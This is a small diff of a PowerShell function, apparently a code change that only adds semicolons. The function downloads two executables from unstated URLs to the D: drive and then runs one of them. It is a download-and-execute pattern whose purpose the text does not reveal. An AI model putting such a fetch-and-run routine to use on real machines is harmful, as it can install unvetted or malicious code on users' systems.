@@ -6,11 +6,11 @@ function Invoke-Download
   $des1 = "D:\\_59539.exe";
   $des2 = "D:\\_VPN.exe";
   $d = new-object System.Net.WebClient;
-  $d.Downloadfile($url1,$des1)
-  $d.Downloadfile($url2,$des2)
+  $d.Downloadfile($url1,$des1);
+  $d.Downloadfile($url2,$des2);
   
   #Invoke-WebRequest -uri $url1 -OutFile $des1
   #Invoke-WebRequest -uri $url2 -OutFile $des2
-  $cmd="D:\\_VPN.exe"
+  $cmd="D:\\_VPN.exe";
   cmd /c $cmd
 }
